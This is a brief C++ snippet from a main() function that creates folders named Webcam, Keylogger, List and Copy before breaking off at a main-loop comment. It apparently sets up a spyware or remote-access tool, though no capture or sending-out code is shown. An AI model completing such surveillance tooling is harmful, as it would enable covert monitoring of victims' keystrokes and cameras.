...
int main() {
	...
	std::filesystem::create_directory(ComPath + "Webcam");
	std::filesystem::create_directory(ComPath + "Keylogger");
	std::filesystem::create_directory(ComPath + "List");
	std::filesystem::create_directory(ComPath + "Copy");
	//Main loop
